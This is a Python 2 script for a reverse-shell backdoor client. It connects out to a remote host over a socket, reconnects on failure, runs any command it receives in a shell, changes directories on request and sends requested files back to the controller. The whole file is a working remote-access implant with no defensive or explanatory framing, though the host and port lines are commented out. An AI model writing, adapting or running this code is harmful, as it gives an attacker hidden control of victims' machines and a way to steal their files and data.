import subprocess, os
from socket import *
import webbrowser
import platform
import ctypes
import hashlib


#host = "10.0.0.0"
#port = 443


def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
# Else Statement : If file not exists . Send : Unable to find out the file .        
    else: 
        s.send('Unable to find out the file')



def main():
    while 1:
        s = socket(AF_INET, SOCK_STREAM)
        while 1:
            try:
                s.connect((host,port))
                print "[INFO] Connected"
                break;
            except:
                pass

        while 1:

            try:
                    command =  s.recv(4096)

                    if 'download' in command:
                        
                        grab,path = command.split('*')
                        
                        try:                         
                            transfer(s,path)
                        except Exception,e:
                            s.send ( str(e) )  
                            pass
                        
                    elif ((command != "exit") and ("cd " not in command) and (command != "begin")):
                        comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        STDOUT, STDERR = comm.communicate()
                        en_STDERR = bytearray(STDERR)
                        en_STDOUT = bytearray(STDOUT)
                        comm.kill()
                        
                        if (en_STDERR == ""): #dealing with invalid commands
                            if (en_STDOUT != ""): #if the command has an output
                                print en_STDOUT
                                s.send(en_STDOUT)
                            else: # if the command has not output then
                                s.send("[CLIENT] Command Executed")

        
                    elif ("cd " in command): #dealing with the cd command
                            command = command.replace("cd ","")
                            os.chdir(command)
                            s.send(os.getcwd())
                            print "[INFO] Changed dir to %s" % os.getcwd()

                    elif (command == "begin"): #welcome message
                          s.send(os.getcwd())
					
            except:
                  print "[INFO] Connection Closed"
                  s.close()
                  break
                                  
                
        
         

main()
